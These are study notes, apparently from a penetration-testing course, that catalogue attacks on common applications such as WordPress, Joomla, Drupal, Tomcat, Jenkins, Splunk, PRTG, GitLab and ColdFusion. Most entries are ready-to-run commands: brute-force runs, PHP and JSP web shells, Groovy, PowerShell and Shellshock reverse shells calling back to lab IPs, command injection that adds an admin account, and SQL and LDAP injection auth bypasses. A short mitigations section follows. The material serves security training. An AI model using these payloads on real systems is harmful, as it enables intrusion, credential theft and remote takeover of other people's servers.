# Attacking Common Applications

## 🎯 Main Idea
- Common off-the-shelf apps (CMS, app servers, monitoring, ticketing, repos) appear in nearly every environment and are prime footholds — exploit both public CVEs and built-in functionality (admin consoles leading to RCE).
- Methodology-first: discover and screenshot web surface at scale, fingerprint app + version, enumerate (manual + automated), then abuse weak/default creds and built-in features before reaching for exploits.
- Each application (WordPress, Joomla, Drupal, Tomcat, Jenkins, Splunk, PRTG, osTicket, GitLab, ColdFusion, etc.) is its own vector with recurring patterns: default creds, file upload/template edit to shell, directory traversal/LFI.

## 💥 Attack / Exploit Vectors

### Application Discovery & Enumeration
- Ping sweep, port scan common web ports, then mass-screenshot to triage hundreds of hosts (High Value Targets first). Note `dev` vhosts, CMS, Tomcat, Splunk, ticketing.
- **Commands**
  - `sudo nmap -p 80,443,8000,8080,8180,8888,10000 --open -oA web_discovery -iL scope_list` — web-port discovery scan across a scope list, all output formats
  - `sudo nmap --open -sV 10.129.201.50` — service/version scan to fingerprint apps on open ports
  - `eyewitness --web -x web_discovery.xml -d inlanefreight_eyewitness` — screenshot report from Nmap XML, fingerprints apps + suggests default creds
  - `cat web_discovery.xml | ./aquatone -nmap` — Aquatone screenshot report from Nmap XML

### WordPress
- Fingerprint via `/robots.txt`, `wp-admin`/`wp-content`, page-source `meta generator`, theme/plugin paths, `readme.txt` for versions. User enumeration via distinct login error messages.
- Attack: brute-force login (xmlrpc faster), then admin → Theme Editor edits an inactive theme's `404.php` to add a PHP web shell. Also vulnerable plugins (mail-masta LFI/SQLi, wpDiscuz file-upload RCE).
- **Commands**
  - `curl -s http://blog.inlanefreight.local | grep WordPress` — confirm WP + grab core version from generator meta
  - `sudo wpscan --url http://blog.inlanefreight.local --enumerate --api-token <TOKEN>` — enumerate plugins/themes/users + known vulns
  - `sudo wpscan --password-attack xmlrpc -t 20 -U john -P /usr/share/wordlists/rockyou.txt --url http://blog.inlanefreight.local` — xmlrpc login brute-force
  - `system($_GET[0]);` — PHP web shell line added to theme `404.php` via Theme Editor
  - `curl http://blog.inlanefreight.local/wp-content/themes/twentynineteen/404.php?0=id` — trigger the theme web shell
  - `curl -s http://blog.inlanefreight.local/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/etc/passwd` — mail-masta LFI
  - `python3 wp_discuz.py -u http://blog.inlanefreight.local -p /?p=1` — wpDiscuz 7.0.4 unauth RCE (CVE-2020-24186); then `curl .../uploads/<shell>.php?cmd=id`
  - Metasploit `exploit/unix/webapp/wp_admin_shell_upload` — auto-upload malicious plugin for meterpreter

### Joomla
- Fingerprint via page-source generator meta, `robots.txt` `/administrator`, `README.txt`, `administrator/manifests/files/joomla.xml`, `plugins/system/cache/cache.xml`. Admin at `/administrator`.
- Attack: brute-force admin, then Templates → edit `error.php` of a template (e.g. protostar) to add PHP shell. CVE-2019-10945 directory traversal/file deletion.
- **Commands**
  - `curl -s http://dev.inlanefreight.local/ | grep Joomla` — confirm Joomla
  - `curl -s http://dev.inlanefreight.local/administrator/manifests/files/joomla.xml | xmllint --format -` — exact version
  - `droopescan scan joomla --url http://dev.inlanefreight.local/` — version + interesting URLs
  - `sudo python3 joomla-brute.py -u http://dev.inlanefreight.local -w /usr/share/metasploit-framework/data/wordlists/http_default_pass.txt -usr admin` — admin brute-force (got `admin:admin`)
  - `system($_GET['dcfdd5e021a869fcc6dfaef8bf31377e']);` — PHP shell added to template `error.php`
  - `curl -s http://dev.inlanefreight.local/templates/protostar/error.php?dcfdd5e021a869fcc6dfaef8bf31377e=id` — trigger shell
  - `python2.7 joomla_dir_trav.py --url ".../administrator/" --username admin --password admin --dir /` — CVE-2019-10945 traversal

### Drupal
- Fingerprint via generator meta, "Powered by Drupal", `CHANGELOG.txt`/`README.txt`, `/node/<id>` URIs. Three Drupalgeddon RCE CVEs.
- Attack: enable PHP Filter module (pre-8) + create Basic page with PHP shell; or upload a backdoored module (needs `.htaccess`); or Drupalgeddon exploits.
- **Commands**
  - `curl -s http://drupal.inlanefreight.local | grep Drupal` — confirm + version from generator meta
  - `curl -s http://drupal-acc.inlanefreight.local/CHANGELOG.txt | grep -m2 ""` — version via changelog
  - `droopescan scan drupal -u http://drupal.inlanefreight.local` — version + plugins
  - `<?php system($_GET['dcfdd5e021a869fcc6dfaef8bf31377e']); ?>` — PHP shell in a Basic page (Text format = PHP code) or backdoored module
  - `curl -s http://drupal-qa.inlanefreight.local/node/3?dcfdd5e021a869fcc6dfaef8bf31377e=id` — trigger shell
  - `python2.7 drupalgeddon.py -t http://drupal-qa... -u hacker -p pwnd` — Drupalgeddon (CVE-2014-3704) adds admin
  - `python3 drupalgeddon2.py` — Drupalgeddon2 (CVE-2018-7600) write PHP file; Drupalgeddon3 via Metasploit `multi/http/drupal_drupageddon3` (needs session cookie)

### Apache Tomcat
- Fingerprint via Server header / `/invalid` 404 page / `/docs`. Key files: `tomcat-users.xml` (roles manager-gui etc.), `WEB-INF/web.xml`. Target `/manager` & `/host-manager`.
- Attack: brute-force manager login (default creds common), then deploy a WAR with a JSP web shell for RCE. Ghostcat AJP LFI (CVE-2020-1938).
- **Commands**
  - `curl -s http://app-dev.inlanefreight.local:8080/docs/ | grep Tomcat` — version
  - `gobuster dir -u http://web01.inlanefreight.local:8180/ -w /usr/share/dirbuster/wordlists/directory-list-2.3-small.txt` — find /manager
  - Metasploit `auxiliary/scanner/http/tomcat_mgr_login` — manager login brute-force
  - `python3 mgr_brute.py -U http://web01...:8180/ -P /manager -u <users> -p <passes>` — scripted manager brute-force
  - `wget <cmd.jsp>; zip -r backup.war cmd.jsp` — package JSP web shell as WAR; deploy via manager, then `curl .../backup/cmd.jsp?cmd=id`
  - `msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.15 LPORT=4443 -f war > backup.war` — reverse-shell WAR
  - `nmap -sV -p 8009,8080 app-dev.inlanefreight.local` — detect AJP for Ghostcat; `python2.7 tomcat-ajp.lfi.py app-dev... -p 8009 -f WEB-INF/web.xml`

### Jenkins
- Runs on Tomcat (default 8080/8000); often weak/default or no auth, frequently as root/SYSTEM. Abuse Script Console (Groovy) for RCE.
- **Commands**
  - Groovy `def cmd = 'id'; def proc = cmd.execute(); ...println sout` — run OS command via `/script` console
  - `r = Runtime.getRuntime(); p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/10.10.14.15/8443;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[]); p.waitFor()` — Groovy Linux reverse shell
  - `def cmd = "cmd.exe /c dir".execute(); println("${cmd.text}");` — Groovy command exec on Windows
  - CVE-2018-1999002 + CVE-2019-1003000 pre-auth RCE; Metasploit `exploit/multi/http/jenkins_script_console`

### Splunk
- Free/trial converts to no-auth; old default `admin:changeme`. RCE via custom app with scripted input (Python/PowerShell/Batch/Bash); runs as root/SYSTEM.
- **Commands**
  - `sudo nmap -sV 10.129.201.50` — detect Splunkd on 8000/8089
  - `inputs.conf`: `[script://./bin/rev.py]` `disabled=0` `interval=10` — scripted input definition
  - `tar -cvzf updater.tar.gz splunk_shell/` — package custom app (.spl/.tar.gz) → "Install app from file"
  - PowerShell one-liner `$client = New-Object System.Net.Sockets.TCPClient('10.10.14.15',443);...` — reverse shell payload (bin/run.ps1)
  - reverse_shell_splunk package (0xjpuff) — ready-made rev-shell app for Windows/Linux

### PRTG Network Monitor
- Fingerprint via Indy httpd / EyeWitness (default `prtgadmin:prtgadmin`). CVE-2018-9276 authenticated command injection via Notifications.
- **Commands**
  - `curl -s http://10.129.201.50:8080/index.htm -A "Mozilla/5.0 ..." | grep version` — confirm version
  - Notification → EXECUTE PROGRAM, param: `test.txt;net user prtgadm1 Pwn3d_by_PRTG! /add;net localgroup administrators prtgadm1 /add` — command injection to add local admin
  - `sudo crackmapexec smb 10.129.201.50 -u prtgadm1 -p Pwn3d_by_PRTG!` — confirm local admin

### osTicket
- Fingerprint via `OSTSESSID` cookie / "powered by osTicket" footer. Few CVEs (SSRF CVE-2020-24881). Main value: abuse functionality — obtain a company email from new-ticket assignment to register on other services; sensitive data exposure in agent queues; credential reuse (login accepts email).
- (Workflow-driven; combine with Dehashed creds + subdomain enum.)

### GitLab
- Fingerprint via login page/logo; version only via `/help` when logged in. Enumerate users via `/users/sign_up` (username/email taken errors); browse `/explore` public projects for secrets/SSH keys; self-register if allowed.
- **Commands**
  - `./gitlab_userenum.sh --url http://gitlab...:8081/ --userlist users.txt` — valid-user enumeration (default lockout 10 tries/10 min)
  - `python3 gitlab_13_10_2_rce.py -t http://gitlab...:8081 -u mrb3n -p password1 -c '<reverse shell cmd>'` — authenticated RCE (CVE via ExifTool, ≤13.10.2)

### Tomcat CGI (CVE-2019-0232)
- Windows + `enableCmdLineArguments` → command injection in CGI Servlet via `&` separator; bypass char filter with URL-encoding; PATH often unset so hardcode full paths.
- **Commands**
  - `ffuf -w /usr/share/dirb/wordlists/common.txt -u http://TARGET:8080/cgi/FUZZ.bat` — find CGI batch script
  - `http://TARGET:8080/cgi/welcome.bat?&dir` — inject `dir`; `?&set` to dump env vars
  - `http://TARGET:8080/cgi/welcome.bat?&c%3A%5Cwindows%5Csystem32%5Cwhoami.exe` — URL-encoded full path to bypass filter

### CGI / Shellshock (CVE-2014-6271)
- Old Bash executes commands appended after a function definition in env vars; inject via HTTP headers (User-Agent) to CGI scripts; runs as web-server user.
- **Commands**
  - `gobuster dir -u http://TARGET/cgi-bin/ -w /usr/share/wordlists/dirb/small.txt -x cgi` — find CGI scripts
  - `curl -H 'User-Agent: () { :; }; echo ; echo ; /bin/cat /etc/passwd' bash -s :'' http://TARGET/cgi-bin/access.cgi` — confirm via file read
  - `curl -H 'User-Agent: () { :; }; /bin/bash -i >& /dev/tcp/10.10.14.38/7777 0>&1' http://TARGET/cgi-bin/access.cgi` — reverse shell

### Thick Client Applications
- Two-tier (direct to DB) vs three-tier (via app server). Not web-XSS/CSRF, but prone to hardcoded creds, insecure storage, DLL hijack, buffer overflow, SQLi, weak session mgmt. Static + dynamic + network + server-side analysis.
- Techniques: ProcMon to capture dropped temp files; x64dbg memory-map dump → strings → De4Dot/dnSpy to recover .NET source & hardcoded creds. For three-tier: extract JAR, edit Spring `beans.xml` (port/secret), strip `MANIFEST.MF` hashes to repackage, then path traversal + UNION-based SQLi (control role/password via fake row) for auth bypass.
- **Commands / tools**
  - ProcMon64, x64dbg, `strings64.exe`, De4Dot, dnSpy, JD-GUI, Ghidra/IDA, Wireshark/tcpdump
  - `jar -cmf .\META-INF\MANIFEST.MF ..\fatty-client-new.jar *` — repackage modified JAR
  - SQLi payload: `abc' UNION SELECT 1,'abc','a@b.com','abc','admin` in username field → login as admin

### ColdFusion
- Java-based (CFML, `.cfm`/`.cfc`); default port 8500; admin at `/CFIDE/administrator`. Many CVEs: directory traversal, unauth RCE.
- **Commands**
  - `nmap -p- -sC -Pn 10.129.247.30 --open` — find port 8500; browse `/CFIDE/administrator` for version (CF8)
  - `searchsploit adobe coldfusion` — find exploits
  - `python2 14641.py 10.129.204.230 8500 "../../../../../../../../ColdFusion8/lib/password.properties"` — CVE-2010-2861 directory traversal to read creds
  - `python3 50057.py` — CVE-2009-2265 unauth RCE (FCKeditor file upload) → reverse shell

### IIS Tilde (8.3 Short Name) Enumeration
- Some IIS versions leak 8.3 short names via `~` requests; enumerate hidden dirs/files, then brute-force full names.
- **Commands**
  - `java -jar iis_shortname_scanner.jar 0 5 http://TARGET/` — automate tilde short-name discovery
  - `egrep -r ^transf /usr/share/wordlists/* | sed 's/^[^:]*://' > /tmp/list.txt` — build wordlist from short name prefix
  - `gobuster dir -u http://TARGET/ -w /tmp/list.txt -x .aspx,.asp` — resolve full filename

### LDAP Injection
- Apps using LDAP for auth are injectable; special chars `* ( ) | &`. Wildcard `*` in username/password fields can bypass authentication.
- **Commands**
  - `nmap -p- -sC -sV --open --min-rate=1000 10.129.204.229` — detect LDAP (389) + web app
  - `ldapsearch -H ldap://host:389 -D "cn=admin,dc=example,dc=com" -w secret123 -b "ou=people,dc=example,dc=com" "(mail=...)"` — query directory
  - Login with `*` / `*` — auth bypass via `(&(objectClass=user)(sAMAccountName=*)(userPassword=*))`

### Web Mass Assignment
- Frameworks auto-bind all submitted params to model attributes; add an unprotected param (e.g. `admin=true`, `confirmed`) to escalate/bypass. Review source; tamper POST in Burp.
- **Commands**
  - POST `username=new&password=test&confirmed=test` to `/register` — set unexpected `confirmed` to bypass approval

### Applications Connecting to Services (Leaked Connection Strings)
- Binaries that connect to DBs often embed credentials. Reverse ELF with GDB/PEDA (breakpoint on `SQLDriverConnect`, read RDX); read .NET DLL connection strings with dnSpy. Reuse creds / password-spray.
- **Commands**
  - `gdb ./octopus_checker` → `set disassembly-flavor intel`; `disas main`; `b *<SQLDriverConnect addr>`; `run` — recover connection string from register
  - `Get-FileMetaData .\MultimasterAPI.dll` + dnSpy — read embedded DB password

## 🛠️ Key Tools & Concepts
- EyeWitness / Aquatone — mass web screenshotting from Nmap/Nessus XML
- Nmap, Gobuster, ffuf — port/service scan and directory/file brute-forcing
- WPScan, droopescan, JoomlaScan — CMS enumeration
- Metasploit (tomcat_mgr_login, wp_admin_shell_upload, drupageddon modules) — scanning/exploitation
- searchsploit / Exploit-DB — finding version-specific exploits
- CrackMapExec / evil-winrm / impacket — validate creds, lateral movement
- dnSpy, De4Dot, JD-GUI, Ghidra, x64dbg, ProcMon, Wireshark, GDB/PEDA — thick-client/binary analysis
- Dehashed — breach-credential OSINT for credential reuse/spraying
- Recurring concepts: default/weak credentials, built-in functionality → RCE (template/theme edit, WAR/plugin upload, script console, scripted inputs), LFI/directory traversal, JSP/PHP web shells, 8.3 short names, mass assignment

## 🛡️ Mitigations
- Maintain an accurate application inventory (find shadow IT, forgotten/trial installs like no-auth Splunk).
- Secure authentication: strong/non-default passwords, disable or rename default admin accounts, mandatory MFA for admins.
- Access controls: keep admin/login pages off the public internet, IP-whitelist manager consoles, least privilege, lock down file/folder upload permissions.
- Disable unsafe features (WP PHP editing, Drupal PHP Filter), patch/update regularly, take backups.
- Security monitoring / WAF (WordFence, Fail2Ban), enforce GitLab sign-up restrictions, require ticket/portal access only internally.
- App-specific: Tomcat manager localhost-only + strong creds; Jenkins Matrix Authorization; Joomla/Drupal hide/move admin login; integrate with AD SSO.
- LDAP/SQLi/mass assignment: validate and sanitize input, parameterized queries, whitelist mass-assignable fields, strip LDAP special chars.
